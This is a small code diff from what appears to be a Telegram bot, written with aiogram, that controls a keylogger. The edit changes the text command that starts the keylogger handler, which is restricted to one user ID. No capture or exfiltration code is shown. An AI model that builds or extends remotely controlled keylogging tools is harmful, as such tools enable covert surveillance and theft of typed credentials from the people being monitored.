@@ -83,7 +83,7 @@ def key_logger_handlers(dp):
     keylogger = KeyLogger(log_file_path)
 
 
-    @dp.message(F.text.casefold().startswith("key logger"))
+    @dp.message(F.text.casefold().startswith("key logger [new]"))
     @dp.message(Command("key_logger"))
     async def start_getting_path(message: types.Message, state: FSMContext):
         if message.from_user.id != ALLOWED_USER_ID:
